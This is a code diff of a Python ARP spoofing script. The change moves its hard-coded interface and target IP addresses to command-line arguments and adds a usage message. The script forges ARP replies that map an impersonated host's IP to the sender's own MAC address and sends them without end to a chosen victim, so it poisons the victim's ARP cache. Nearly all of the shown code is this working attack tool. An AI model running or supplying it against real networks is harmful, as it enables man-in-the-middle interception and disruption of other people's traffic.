@@ -4,13 +4,7 @@ from uuid import getnode as get_mac
 from struct import pack
 from socket import socket, AF_PACKET, AF_INET, SOCK_RAW, SOCK_DGRAM, PACKET_BROADCAST
 import sys
-
-
-#<config
-INTERFACE = 'wlp3s0'
-IMPERSONATED_HOST_IP = '192.168.1.120'
-POISONED_HOST_IP = '192.168.1.1'
-#>
+import inspect
 
 
 ONE_BYTE = '!B'
@@ -116,28 +110,43 @@ def create_arp_packet(sender_ip, target_ip, sender_mac, target_mac):
                      create_arp_reply_payload(sender_ip, target_ip, sender_mac, target_mac)]) 
 
 
-def send(packet):
+def send(packet, interface):
     with socket(AF_PACKET, SOCK_RAW) as s:
-        s.bind((INTERFACE, 0))
+        s.bind((interface, 0))
         s.send(packet)
 
 
-def main():
-    poisoned_host_mac = find_mac_by_ip(POISONED_HOST_IP)
+def main(interface, impersonated_host_ip, poisoned_host_ip):
+    poisoned_host_mac = find_mac_by_ip(poisoned_host_ip)
     impersonated_host_mac = get_mac()
 
-    packet = create_arp_packet(sender_ip=IMPERSONATED_HOST_IP,
-                               target_ip=POISONED_HOST_IP,
+    packet = create_arp_packet(sender_ip=impersonated_host_ip,
+                               target_ip=poisoned_host_ip,
                                sender_mac=impersonated_host_mac,
                                target_mac=poisoned_host_mac)
     
     while True:
-        send(packet)
+        send(packet, interface)
+
+
+def print_help():
+    doc = '''
+        USAGE:
+        
+        {} INTERFACE IMPERSONATED_HOST_IP POISONED_HOST_IP
+    '''.format(__file__)
+    print(inspect.cleandoc(doc))
 
 
 if __name__ == '__main__':
     try:
-        main()
+        (script_name, interface, impersonated_host_ip, poisoned_host_ip) = sys.argv
+    except ValueError:
+        print_help() 
+        sys.exit(1)
+
+    try:
+        main(interface, impersonated_host_ip, poisoned_host_ip)
     except KeyboardInterrupt:
         print('\nDone.')
         sys.exit(0)
